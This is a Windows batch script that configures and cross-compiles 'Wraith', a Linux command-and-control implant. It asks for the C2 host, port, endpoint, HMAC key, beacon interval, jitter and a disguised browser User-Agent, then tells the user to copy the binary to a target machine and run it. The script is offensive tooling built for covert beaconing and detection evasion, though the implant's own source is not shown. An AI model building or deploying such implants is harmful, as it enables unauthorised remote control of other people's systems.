@echo off
setlocal enabledelayedexpansion

echo ==========================================
echo   Wraith Linux Agent Builder (Windows)
echo ==========================================
echo.

REM Prompt for configuration
set /p C2_HOST="C2 Relay Host [localhost]: "
if "%C2_HOST%"=="" set C2_HOST=localhost

set /p C2_PORT="C2 Relay Port [8081]: "
if "%C2_PORT%"=="" set C2_PORT=8081

set /p C2_ENDPOINT="C2 Endpoint [/wiki]: "
if "%C2_ENDPOINT%"=="" set C2_ENDPOINT=/wiki

set /p HMAC_KEY="HMAC Key (hex): "

if "%HMAC_KEY%"=="" (
    echo [ERROR] HMAC key is required!
    exit /b 1
)

set /p BEACON_INTERVAL="Beacon Interval (seconds) [15]: "
if "%BEACON_INTERVAL%"=="" set BEACON_INTERVAL=15

set /p JITTER="Jitter (seconds) [10]: "
if "%JITTER%"=="" set JITTER=10

set /p USER_AGENT="User Agent [Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36]: "
if "%USER_AGENT%"=="" set USER_AGENT=Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36

echo.
echo Configuration:
echo   Host:            %C2_HOST%
echo   Port:            %C2_PORT% (QUIC/HTTP3)
echo   Endpoint:        %C2_ENDPOINT%
echo   HMAC Key:        %HMAC_KEY:~0,16%...%HMAC_KEY:~-8%
echo   Beacon Interval: %BEACON_INTERVAL%s
echo   Jitter:          %JITTER%s
echo.

echo [*] Cross-compiling for Linux (x86_64-unknown-linux-musl)...
echo.

REM Check if musl target is installed
rustup target list | findstr /C:"x86_64-unknown-linux-musl (installed)" >nul
if %ERRORLEVEL% NEQ 0 (
    echo [*] Installing x86_64-unknown-linux-musl target...
    rustup target add x86_64-unknown-linux-musl
    if %ERRORLEVEL% NEQ 0 (
        echo [ERROR] Failed to install Linux target
        exit /b 1
    )
)

REM Build with environment variables for Linux target
set WRAITH_HOST=%C2_HOST%
set WRAITH_PORT=%C2_PORT%
set WRAITH_ENDPOINT=%C2_ENDPOINT%
set WRAITH_HMAC_KEY=%HMAC_KEY%
set WRAITH_USER_AGENT=%USER_AGENT%

cargo build --release --target=x86_64-unknown-linux-musl

if %ERRORLEVEL% EQU 0 (
    echo.
    echo [SUCCESS] Build complete: target\x86_64-unknown-linux-musl\release\wraith
    echo.
    echo This binary is for Linux x86_64 systems.
    echo Transfer it to your target Linux machine and run.
    echo.
    dir target\x86_64-unknown-linux-musl\release\wraith
) else (
    echo.
    echo [ERROR] Build failed!
    echo.
    echo If you see linker errors, you may need to install:
    echo   - Visual Studio Build Tools with C++ support
    echo   - Or use WSL to build natively on Linux
    exit /b 1
)
